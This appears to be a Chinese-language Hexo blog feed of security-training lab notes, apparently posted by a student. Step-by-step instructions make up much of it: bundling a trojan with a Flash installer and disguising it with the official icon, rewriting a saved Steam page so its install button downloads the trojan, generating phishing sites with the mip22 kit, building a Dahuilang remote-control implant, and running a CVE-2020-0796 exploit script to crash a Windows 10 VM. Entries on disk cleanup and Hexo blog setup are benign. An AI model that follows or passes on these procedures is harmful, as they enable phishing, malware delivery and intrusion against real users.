src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701241753531-9555e108-697c-4d2a-8149-fca5d5a7d215.png" alt="image.png"><br /></p></li><li><p>点击设置，添加 </p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">“C:\windows\temp\flashcenter_pp_ax_install_cn.exe</span><br><span class="line">C:\windows\temp\**22**.exe  ”（**文件名需要一样**）</span><br></pre></td></tr></table></figure><p>   <img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701241831902-fc2fe6da-24fd-4775-8399-67014edb1545.png" alt="image.png"><br /></p></li><li><p>随后设置“模式”以及“更新”，配置如图所示<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701241960291-a513626a-4fa5-404b-a20c-b9293fb67a08.png" alt="image.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701241973005-c8aebbc6-89a5-48ef-8a29-eb861d05227b.png" alt="image.png"><br /></p></li></ul></li><li><h2 id="替换图标"><a href="#替换图标" class="headerlink" title="替换图标"></a><strong>替换图标</strong><br /></h2></li></ol><ul><li><p>下载图标更改软件<a href="https://www.yuque.com/attachments/yuque/0/2023/rar/40675601/1701243470804-2a50418d-9d7c-4973-8281-305c5996da5d.rar?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/rar/40675601/1701243470804-2a50418d-9d7c-4973-8281-305c5996da5d.rar%22,%22name%22:%22ResourceHacker.rar%22,%22size%22:1638483,%22ext%22:%22rar%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u81648874-bf37-42b4-adbb-bb9daebab31%22,%22taskType%22:%22upload%22,%22type%22:%22%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u91acf08f%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">ResourceHacker.rar</a><br /></p></li><li><p>打开软件，并且将”flash“官方压缩包以及上一步打包的压缩文件一起拖动至软件处。<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701243581114-cd72728d-b076-404b-a5dd-bfe5638e9d88.png" alt="image.png"><br /></p></li><li><p>将官方压缩包的图标进行复制，将木马压缩包的图标进行删除（理解为将官方压缩包的图标复制至木马压缩包里）<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701243797133-ea412496-2b26-4131-a7c2-78067d356ec0.png" alt="image.png"><br /></p></li><li><p>重新将更改图标的木马压缩包保存至磁盘<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701243865104-5f5de3dd-2b6d-4472-a38f-a2d2a29cd410.png" alt="image.png"><br /></p></li></ul><ol start="3"><li><h2 id="3-进行钓鱼"><a href="#3-进行钓鱼" class="headerlink" title="3.进行钓鱼"></a><strong>3.进行钓鱼</strong><br /></h2></li></ol><ul><li><p>将替换图标的木马压缩包进入根目录替换，将文件名更改为”flash.exe”<strong>(因为上一个原因图标没更改，其实际已经更改）</strong><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701244610194-f507de2f-10c7-4b6c-a958-4e337ca0fdb6.png" alt="image.png"><br /></p></li><li><p>打开网页并点击“立即更新”后，会得到如下：<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701244721066-f3f1a1d8-fef6-4c0f-b879-bcfcfa3b4bea.png" alt="image.png"><br /></p></li><li><p>打开所下载文件，则会将之前打包的文件自行打开，效果如下<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701244772256-b0b34e17-2aa8-4717-a2df-d9c79292caec.png" alt="image.png"></p><h1 id="自行进行钓鱼网站的制作（steam）"><a href="#自行进行钓鱼网站的制作（steam）" class="headerlink" title="**自行进行钓鱼网站的制作（steam）"></a>**自行进行钓鱼网站的制作（steam）</h1></li></ul><ol><li><h2 id="打开steam官网，对页面进行保存（右击另存为）"><a href="#打开steam官网，对页面进行保存（右击另存为）" class="headerlink" title="打开steam官网，对页面进行保存（右击另存为）"></a>打开steam官网，对页面进行保存（右击另存为）<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701261170687-8c805a91-007c-4ba3-b423-aa0157826f1b.png" alt="image.png"><br /></h2></li><li><h2 id="下载完成后会得到一个html文件以及一个文件夹。"><a href="#下载完成后会得到一个html文件以及一个文件夹。" class="headerlink" title="下载完成后会得到一个html文件以及一个文件夹。"></a>下载完成后会得到一个html文件以及一个文件夹。<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701260920209-e2a8d40f-94c8-4783-8b01-eff238e7974e.png" alt="image.png"><br /></h2></li><li><h2 id="将两个文件拷贝进虚拟机“C-phpstudy-pro-WWW”目录下。并且进行更名（html文件改为index-html"><a href="#将两个文件拷贝进虚拟机“C-phpstudy-pro-WWW”目录下。并且进行更名（html文件改为index-html" class="headerlink" title="将两个文件拷贝进虚拟机“C:\phpstudy_pro\WWW”目录下。并且进行更名（html文件改为index.html)"></a>将两个文件拷贝进虚拟机“C:\phpstudy_pro\WWW”目录下。并且进行更名（html文件改为index.html)<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701260992673-011c69a1-6e3c-4b8e-a1f4-c2008ce44ef6.png" alt="image.png"><br /></h2></li><li><h2 id="此次将不调用js文件，是通过页面按钮模块点击，直接下载木马压缩包"><a href="#此次将不调用js文件，是通过页面按钮模块点击，直接下载木马压缩包" class="headerlink" title="此次将不调用js文件，是通过页面按钮模块点击，直接下载木马压缩包."></a>此次将不调用js文件，是通过页面按钮模块点击，直接下载木马压缩包.<br /></h2></li><li><h2 id="将index-html用记事本打开，并且找到需要的按钮模块。（此次找“安装STEAM”按钮），将地址改为木马压缩包所在地址“http-192-168-2-104-steam-exe”，并且保存。"><a href="#将index-html用记事本打开，并且找到需要的按钮模块。（此次找“安装STEAM”按钮），将地址改为木马压缩包所在地址“http-192-168-2-104-steam-exe”，并且保存。" class="headerlink" title="将index.html用记事本打开，并且找到需要的按钮模块。（此次找“安装STEAM”按钮），将地址改为木马压缩包所在地址“http://192.168.2.104/steam.exe”，并且保存。"></a>将index.html用记事本打开，并且找到需要的按钮模块。（此次找“安装STEAM”按钮），将地址改为木马压缩包所在地址“<a href="http://192.168.2.104/steam.exe">http://192.168.2.104/steam.exe</a>”，并且保存。<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701261306952-7991d975-57e6-4063-ad38-037a99268673.png" alt="image.png"><br /></h2></li><li><h2 id="运行网址，并且点击“安装STEAM”按钮，则会弹出对木马压缩包下载提示"><a href="#运行网址，并且点击“安装STEAM”按钮，则会弹出对木马压缩包下载提示" class="headerlink" title="运行网址，并且点击“安装STEAM”按钮，则会弹出对木马压缩包下载提示"></a>运行网址，并且点击“安装STEAM”按钮，则会弹出对木马压缩包下载提示<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701261444718-0d8575a7-f1e6-4367-94cb-4bfc3e2d6dd1.png" alt="image.png"><br /></h2></li><li><h2 id="页面制作完成"><a href="#页面制作完成" class="headerlink" title="页面制作完成"></a>页面制作完成</h2></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Quasar远程软件的使用&quot;&gt;&lt;a href=&quot;#Quasar远程软件的使用&quot; class=&quot;headerlink&quot; title=&quot;Quasar远程软件的使用&quot;&gt;&lt;/a&gt;Quasar远程软件的使用&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;h2 id=&quot;在网盘上下载Quasar</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>11.28（钓鱼网站、大灰狼远程）</title>
    <link href="http://example.com/2023/12/01/11.28%EF%BC%88%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E3%80%81%E5%A4%A7%E7%81%B0%E7%8B%BC%E8%BF%9C%E7%A8%8B%EF%BC%89/"/>
    <id>http://example.com/2023/12/01/11.28%EF%BC%88%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E3%80%81%E5%A4%A7%E7%81%B0%E7%8B%BC%E8%BF%9C%E7%A8%8B%EF%BC%89/</id>
    <published>2023-12-01T06:56:53.249Z</published>
    <updated>2023-12-01T09:17:54.516Z</updated>
    
    <content type="html"><![CDATA[<h1 id="钓鱼网站制作"><a href="#钓鱼网站制作" class="headerlink" title="钓鱼网站制作"></a>钓鱼网站制作</h1><ol><li><h2 id="前提准备："><a href="#前提准备：" class="headerlink" title="前提准备："></a><strong>前提准备：</strong><br /></h2></li></ol><ul><li><h3 id="kali（账号：root，密码：123456）"><a href="#kali（账号：root，密码：123456）" class="headerlink" title="kali（账号：root，密码：123456）"></a>kali（账号：root，密码：123456）<br /></h3></li><li><h3 id="基础环境搭建"><a href="#基础环境搭建" class="headerlink" title="基础环境搭建"></a>基础环境搭建<br /></h3></li><li><h3 id="打开终端输入“vim-etc-proxychains4-conf-”，键盘方向键至最下端，输入“esc”-“i”改为插入模式，改为：改成-“socks5-ip地址-port“-（端口）。例如下方”socks5-192-168-2-46-7890“"><a href="#打开终端输入“vim-etc-proxychains4-conf-”，键盘方向键至最下端，输入“esc”-“i”改为插入模式，改为：改成-“socks5-ip地址-port“-（端口）。例如下方”socks5-192-168-2-46-7890“" class="headerlink" title="打开终端输入“vim &#x2F;etc&#x2F;proxychains4.conf ”，键盘方向键至最下端，输入“esc”+“i”改为插入模式，改为：改成 “socks5 ip地址 port“ （端口）。例如下方”socks5 192.168.2.46 7890“"></a>打开终端输入“vim &#x2F;etc&#x2F;proxychains4.conf ”，键盘方向键至最下端，输入<strong>“esc”+“i”</strong>改为插入模式，改为：改成 “socks5 ip地址 port“ （端口）。例如下方”socks5 192.168.2.46 7890“<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701318686809-b540e640-ccbf-4e47-9cec-877263a01330.png" alt="image.png"><br /></h3></li></ul><ol start="2"><li><h2 id="制作步骤："><a href="#制作步骤：" class="headerlink" title="制作步骤："></a>制作步骤：<br /></h2></li></ol><ul><li><h3 id="打开终端，输入“ls”（确认mp22）"><a href="#打开终端，输入“ls”（确认mp22）" class="headerlink" title="打开终端，输入“ls”（确认mp22）"></a>打开终端，输入“ls”（确认mp22）<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701318786011-1b5bd402-e9cf-4e7d-a0e3-8f11ccc5e5eb.png" alt="image.png"><br /></h3></li><li><h3 id="继续依次输入一下指令："><a href="#继续依次输入一下指令：" class="headerlink" title="继续依次输入一下指令："></a>继续<strong>依次</strong>输入一下指令：</h3></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd mip22</span><br><span class="line">chmod +x ./* </span><br><span class="line">proxychains4 -q bash ./mip22.sh</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701319305889-407d7809-5629-4b4d-b4b8-3165e6fc674a.png" alt="image.png"><br /></h3><ul><li><h3 id="按下回车后得到界面，输入“1”后，回车。"><a href="#按下回车后得到界面，输入“1”后，回车。" class="headerlink" title="按下回车后得到界面，输入“1”后，回车。"></a>按下回车后得到界面，输入“1”后，回车。<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701319401285-99d1f305-5ff6-49e4-8c9d-31373287afae.png" alt="image.png"><br /></h3></li><li><h3 id="回车后，页面中需要你输入相应数字选择需要制作钓鱼网站的页面，以steam为例，则输入“51”后，回车。"><a href="#回车后，页面中需要你输入相应数字选择需要制作钓鱼网站的页面，以steam为例，则输入“51”后，回车。" class="headerlink" title="回车后，页面中需要你输入相应数字选择需要制作钓鱼网站的页面，以steam为例，则输入“51”后，回车。#"></a>回车后，页面中需要你输入相应数字选择需要制作钓鱼网站的页面，以steam为例，则输入“51”后，回车。#<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701319510489-4230009e-6643-4ba1-a716-ca47cd2b349a.png" alt="image.png"><br /></h3></li><li><h3 id="继续输入“3”，回车"><a href="#继续输入“3”，回车" class="headerlink" title="继续输入“3”，回车"></a>继续输入“3”，回车<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701319607093-f3e7cc34-96f0-407d-9a1f-d08649ca941d.png" alt="image.png"><br /></h3></li><li><h3 id="等生成网站后选择“http（s）：”后的网址进行复制，钓鱼网站制作完成。若有访问则会再次窗口有所提示。"><a href="#等生成网站后选择“http（s）：”后的网址进行复制，钓鱼网站制作完成。若有访问则会再次窗口有所提示。" class="headerlink" title="等生成网站后选择“http（s）：”后的网址进行复制，钓鱼网站制作完成。若有访问则会再次窗口有所提示。"></a>等生成网站后选择“http（s）：”后的网址进行复制，钓鱼网站制作完成。若有访问则会再次窗口有所提示。<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701319650273-b2d93409-ac63-4c96-a035-d40e959db10b.png" alt="image.png"></h3></li></ul><h1 id="远程操控（大灰狼）实验"><a href="#远程操控（大灰狼）实验" class="headerlink" title="远程操控（大灰狼）实验"></a><strong>远程操控（大灰狼）实验</strong></h1><ol><li><h2 id="由网盘下载远程控制软件。实验由物理机以及虚拟机互动实现（需关闭双端的安全防护）打开软件界面如下"><a href="#由网盘下载远程控制软件。实验由物理机以及虚拟机互动实现（需关闭双端的安全防护）打开软件界面如下" class="headerlink" title="由网盘下载远程控制软件。实验由物理机以及虚拟机互动实现（需关闭双端的安全防护）打开软件界面如下"></a>由网盘下载远程控制软件。实验由物理机以及虚拟机互动实现（<strong>需关闭双端的安全防护</strong>）<br />打开软件界面如下<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701161494017-bf4866c9-1f6b-445b-8d82-63b43454a117.png" alt="image.png"><br /></h2></li><li><h2 id="点击服务生成"><a href="#点击服务生成" class="headerlink" title="点击服务生成"></a>点击服务生成<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701161513765-9c648491-815e-4d48-ac9d-3eaf8052fce0.png" alt="image.png"><br /></h2></li><li><h2 id="在域名IP入口输入物理机的IP-随后点击生成服务"><a href="#在域名IP入口输入物理机的IP-随后点击生成服务" class="headerlink" title="在域名IP入口输入物理机的IP,随后点击生成服务"></a>在域名IP入口输入<strong>物理机的IP</strong>,随后点击生成服务<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701161559342-f7ff06a4-88ea-4257-a5ce-2a33158c4888.png" alt="image.png"><br /></h2></li><li><h2 id="需要讲生成的文件进行保存并上传至虚拟机。"><a href="#需要讲生成的文件进行保存并上传至虚拟机。" class="headerlink" title="需要讲生成的文件进行保存并上传至虚拟机。"></a>需要讲生成的文件进行保存并上传至虚拟机。<br /></h2></li><li><h2 id="虚拟机双击导入的文件后，则在软件上会显示相应控制。右击标红区域则会显示控制功能。"><a href="#虚拟机双击导入的文件后，则在软件上会显示相应控制。右击标红区域则会显示控制功能。" class="headerlink" title="虚拟机双击导入的文件后，则在软件上会显示相应控制。右击标红区域则会显示控制功能。"></a>虚拟机双击导入的文件后，则在软件上会显示相应控制。<strong>右击标红区域则会显示控制功能。</strong><br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701161716637-b53682d2-d9b4-4be0-9416-a639ee8cdf85.png" alt="image.png"></h2></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;钓鱼网站制作&quot;&gt;&lt;a href=&quot;#钓鱼网站制作&quot; class=&quot;headerlink&quot; title=&quot;钓鱼网站制作&quot;&gt;&lt;/a&gt;钓鱼网站制作&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;h2 id=&quot;前提准备：&quot;&gt;&lt;a href=&quot;#前提准备：&quot; class=&quot;headerlin</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>11.27（python环境配置，永恒之黑）</title>
    <link href="http://example.com/2023/12/01/11.27%EF%BC%88%E6%B3%A8%E5%86%8Ctg%EF%BC%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%EF%BC%89/"/>
    <id>http://example.com/2023/12/01/11.27%EF%BC%88%E6%B3%A8%E5%86%8Ctg%EF%BC%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%EF%BC%89/</id>
    <published>2023-12-01T02:43:49.852Z</published>
    <updated>2023-12-03T03:39:20.118Z</updated>
    
    <content type="html"><![CDATA[<ol><li><h1 id="python环境配置"><a href="#python环境配置" class="headerlink" title="python环境配置"></a>python环境配置</h1></li><li><h2 id="在给的网址192-168-2-6：5244中，根据路径-网盘-百度网盘-软件大全-语言环境-下载一个python语言环境python环境配置"><a href="#在给的网址192-168-2-6：5244中，根据路径-网盘-百度网盘-软件大全-语言环境-下载一个python语言环境python环境配置" class="headerlink" title="在给的网址192.168.2.6：5244中，根据路径 网盘 百度网盘 软件大全 语言环境 下载一个python语言环境python环境配置"></a>在给的网址192.168.2.6：5244中，根据路径 网盘 百度网盘 软件大全 语言环境 下载一个python语言环境python环境配置</h2></li><li><h2 id="在保存的文件目录上输入指令“cmd”"><a href="#在保存的文件目录上输入指令“cmd”" class="headerlink" title="在保存的文件目录上输入指令“cmd”"></a>在保存的文件目录上输入指令“cmd”</h2></li><li><h2 id="进入到配置里面，输入python，会出现调试正确的python语言环境"><a href="#进入到配置里面，输入python，会出现调试正确的python语言环境" class="headerlink" title="进入到配置里面，输入python，会出现调试正确的python语言环境"></a>进入到配置里面，输入python，会出现调试正确的python语言环境</h2></li></ol><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231203113833926.png" alt="image-20231203113833926"></p><ol start="2"><li><h1 id="永恒之黑实验步骤："><a href="#永恒之黑实验步骤：" class="headerlink" title="永恒之黑实验步骤："></a><strong>永恒之黑实验步骤：</strong><br /></h1></li><li><h2 id="在资源库中下载准备软件：VM、攻击脚本以及win10虚拟机。准备如下："><a href="#在资源库中下载准备软件：VM、攻击脚本以及win10虚拟机。准备如下：" class="headerlink" title="在资源库中下载准备软件：VM、攻击脚本以及win10虚拟机。准备如下："></a>在资源库中下载准备软件：VM、攻击脚本以及win10虚拟机。准备如下：<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231201133934934.png" alt="image-20231201133934934"><br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701172896440-18de2331-cba8-47c1-b510-ef11bb037cb4.png" alt="image.png"><br /></h2></li><li><h2 id="打开虚拟机，在其页面输入“win-R”在输入框中输入“cmd”："><a href="#打开虚拟机，在其页面输入“win-R”在输入框中输入“cmd”：" class="headerlink" title="打开虚拟机，在其页面输入“win+R”在输入框中输入“cmd”："></a>打开虚拟机，在其页面输入“<strong>win+R</strong>”在输入框中输入“<strong>cmd</strong>”：<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701173034399-17b7a1ac-0a15-445d-bf20-b5860c4d4bc7.png" alt="image.png"><br /></h2></li><li><h2 id="在终端输入框中输入“ipconfig”按下回车键之后得到：ipv4地址为：192-168-2-104"><a href="#在终端输入框中输入“ipconfig”按下回车键之后得到：ipv4地址为：192-168-2-104" class="headerlink" title="在终端输入框中输入“ipconfig”按下回车键之后得到：ipv4地址为：192.168.2.104"></a>在终端输入框中输入“<strong>ipconfig</strong>”按下回车键之后得到：ipv4地址为：<strong>192.168.2.104</strong><br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701173095255-beb19bd9-2366-4051-95ba-920a8f6d0cfe.png" alt="image.png"><br /></h2></li><li><h2 id="在所下载脚本目录打开终端，输入“python-CVE-2020-0796-py-192-168-2-104”（192-168-2-104为虚拟机的ipv4地址），如若第一次运行，则在此会提示缺少相应文件。"><a href="#在所下载脚本目录打开终端，输入“python-CVE-2020-0796-py-192-168-2-104”（192-168-2-104为虚拟机的ipv4地址），如若第一次运行，则在此会提示缺少相应文件。" class="headerlink" title="在所下载脚本目录打开终端，输入“python .\CVE-2020-0796.py 192.168.2.104”（192.168.2.104为虚拟机的ipv4地址），如若第一次运行，则在此会提示缺少相应文件。"></a>在所下载脚本目录打开终端，输入“<strong>python .\CVE-2020-0796.py 192.168.2.104</strong>”（<strong>192.168.2.104</strong>为虚拟机的ipv4地址），如若第一次运行，则在此会提示缺少相应文件。<br /></h2></li><li><h2 id="在提示缺失相应文件后输入“pip-install-xxxxx-i-http-mirrors-aliyun-com-pypi-simple-–trusted-host-mirrors-aliyun-com”（xxxxx为对应缺失文件，-i-http-之后则为下载加速连接-6-在下载完相应缺失文件后再次输入“python-CVE-2020-0796-py-192-168-2-104-”，若还确实重复上述操作。直到运行成功，按下回车之后则虚拟机开始蓝屏。"><a href="#在提示缺失相应文件后输入“pip-install-xxxxx-i-http-mirrors-aliyun-com-pypi-simple-–trusted-host-mirrors-aliyun-com”（xxxxx为对应缺失文件，-i-http-之后则为下载加速连接-6-在下载完相应缺失文件后再次输入“python-CVE-2020-0796-py-192-168-2-104-”，若还确实重复上述操作。直到运行成功，按下回车之后则虚拟机开始蓝屏。" class="headerlink" title="在提示缺失相应文件后输入“pip install  xxxxx -i http://mirrors.aliyun.com/pypi/simple/ –trusted-host mirrors.aliyun.com”（xxxxx为对应缺失文件，**-i http:之后则为下载加速连接)6.在下载完相应缺失文件后再次输入“python .\CVE-2020-0796.py 192.168.2.104**”，若还确实重复上述操作。直到运行成功，按下回车之后则虚拟机开始蓝屏。"></a>在提示缺失相应文件后输入“<strong>pip install  xxxxx -i <strong><a href="http://mirrors.aliyun.com/pypi/simple/"><strong>http://mirrors.aliyun.com/pypi/simple/</strong></a></strong> –trusted-host mirrors.aliyun.com</strong>”（<strong>xxxxx</strong>为对应缺失文件，**-i http:<strong>之后则为下载加速连接)<br />6.在下载完相应缺失文件后再次输入“</strong>python .\CVE-2020-0796.py 192.168.2.104**”，若还确实重复上述操作。直到运行成功，按下回车之后则虚拟机开始蓝屏。</h2></li></ol><br />]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;&lt;h1 id=&quot;python环境配置&quot;&gt;&lt;a href=&quot;#python环境配置&quot; class=&quot;headerlink&quot; title=&quot;python环境配置&quot;&gt;&lt;/a&gt;python环境配置&lt;/h1&gt;&lt;/li&gt;
&lt;li&gt;&lt;h2 id=&quot;在给的网址192-168-2</summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>11-30(电脑空间回收、利用github搭建hexo博客）</title>
    <link href="http://example.com/2023/11/30/11-30(%E7%94%B5%E8%84%91%E7%A9%BA%E9%97%B4%E5%9B%9E%E6%94%B6%E3%80%81%E5%88%A9%E7%94%A8github%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2%EF%BC%89/"/>
    <id>http://example.com/2023/11/30/11-30(%E7%94%B5%E8%84%91%E7%A9%BA%E9%97%B4%E5%9B%9E%E6%94%B6%E3%80%81%E5%88%A9%E7%94%A8github%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2%EF%BC%89/</id>
    <published>2023-11-30T06:35:46.032Z</published>
    <updated>2023-12-02T14:44:18.760Z</updated>
    
    <content type="html"><![CDATA[<h1 id="电脑空间回收"><a href="#电脑空间回收" class="headerlink" title="电脑空间回收"></a>电脑空间回收</h1><ol><li><h2 id="下载dism软件Dism-10-1-1002-1-zip"><a href="#下载dism软件Dism-10-1-1002-1-zip" class="headerlink" title="下载dism软件Dism++10.1.1002.1.zip"></a>下载dism软件<a href="https://www.yuque.com/attachments/yuque/0/2023/zip/40675601/1701306794965-a433ccfa-d97c-40f4-8b83-2fa6014eaa61.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2023/zip/40675601/1701306794965-a433ccfa-d97c-40f4-8b83-2fa6014eaa61.zip%22,%22name%22:%22Dism%20%2010.1.1002.1.zip%22,%22size%22:3776223,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22uf77092a4-3766-47d6-bd93-5912da0665a%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22ud135afba%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">Dism++10.1.1002.1.zip</a><br /></h2></li><li><h2 id="解压缩dism软件并且打开“Dism-x86-exe”。"><a href="#解压缩dism软件并且打开“Dism-x86-exe”。" class="headerlink" title="解压缩dism软件并且打开“Dism++x86.exe”。"></a>解压缩dism软件并且打开“Dism++x86.exe”。<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701306830121-7a8c431f-2e7b-4296-93f1-c45907757109.png" alt="image.png"><br /></h2></li><li><h2 id="点击左栏“空间回收”，将文件全部勾选后，点击扫描"><a href="#点击左栏“空间回收”，将文件全部勾选后，点击扫描" class="headerlink" title="点击左栏“空间回收”，将文件全部勾选后，点击扫描"></a>点击左栏“空间回收”，将文件全部勾选后，点击扫描<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701306889775-72ea0294-02e3-4742-937f-da509d037eae.png" alt="image.png"><br /></h2></li><li><h2 id="等扫描完成后，点击清理即可。"><a href="#等扫描完成后，点击清理即可。" class="headerlink" title="等扫描完成后，点击清理即可。"></a>等扫描完成后，点击清理即可。<br /></h2></li><li><h2 id="将电脑除“桌面”外的文件位置改为其他硬盘"><a href="#将电脑除“桌面”外的文件位置改为其他硬盘" class="headerlink" title="将电脑除“桌面”外的文件位置改为其他硬盘"></a>将电脑除“桌面”外的文件位置改为其他硬盘<br /><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701306961244-95fc5663-acf8-4d37-80cd-d0b13f81fbf4.png" alt="image.png"></h2></li></ol><h1 id="利用github搭建hexo博客"><a href="#利用github搭建hexo博客" class="headerlink" title="利用github搭建hexo博客"></a>利用github搭建hexo博客</h1><ol><li><h2 id="前提工作："><a href="#前提工作：" class="headerlink" title="前提工作："></a>前提工作：</h2></li></ol><blockquote><ul><li>挂代理</li><li>提前安装好(node.js)<a href="https://nodejs.org/en]">[https://nodejs.org/en]</a> 左边的那个</li><li>提前安装好(GIt)<a href="https://git-scm.com/downloads]">[https://git-scm.com/downloads]</a></li><li>提前注册好一个github账号[<a href="https://github.com/">https://github.com/</a>]</li></ul></blockquote><ol start="2"><li><h2 id="创建一个本地文件夹（全英文路径）"><a href="#创建一个本地文件夹（全英文路径）" class="headerlink" title="创建一个本地文件夹（全英文路径）"></a>创建一个本地文件夹（<strong>全英文路径</strong>）<br /></h2></li><li><h2 id="在文件夹内打开终端依次输入指令（使用npm命令安装Hexo）"><a href="#在文件夹内打开终端依次输入指令（使用npm命令安装Hexo）" class="headerlink" title="在文件夹内打开终端依次输入指令（使用npm命令安装Hexo）"></a>在文件夹内打开终端<strong>依次</strong>输入指令（使用npm命令安装Hexo）</h2></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701312156594-b2bb160f-9182-4cc5-a027-59fa03d5e28c.png" alt="image.png"><br >效果如下：<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701312181943-e372f700-082c-4d7e-987a-83d724ceb449.png" alt="image.png"></p><ol start="4"><li><h2 id="依次输入以下指令："><a href="#依次输入以下指令：" class="headerlink" title="依次输入以下指令："></a>依次输入以下指令：</h2></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new test_my_site</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701321274874-4acf0c42-cbcd-467d-9f64-ee2b29e50334.png" alt="image.png"><br ></p><ol start="5"><li><h2 id="配置ssh，依次输入"><a href="#配置ssh，依次输入" class="headerlink" title="配置ssh，依次输入"></a>配置ssh，依次输入</h2></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh  （如果提示：No such file <span class="keyword">or</span> directory 说明你是第一次使用git。）</span><br><span class="line">ssh-keygen -t rsa -C “邮件地址”（连按三次回车）</span><br></pre></td></tr></table></figure><ol start="6"><li><h2 id="最终会生成一个文件在用户目录下，打开用户目录，找到-ssh-id-rsa-pub文件（如没有，打开隐藏选项），记事本打开并复制里面的内容"><a href="#最终会生成一个文件在用户目录下，打开用户目录，找到-ssh-id-rsa-pub文件（如没有，打开隐藏选项），记事本打开并复制里面的内容" class="headerlink" title="最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件（如没有，打开隐藏选项），记事本打开并复制里面的内容"></a>最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件（如没有，打开隐藏选项），记事本打开并复制里面的内容<img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/1701322687591-627b36fc-f829-4ab7-8bc0-ec54f75cfc71.png" alt="image.png"><br /></h2></li><li><h2 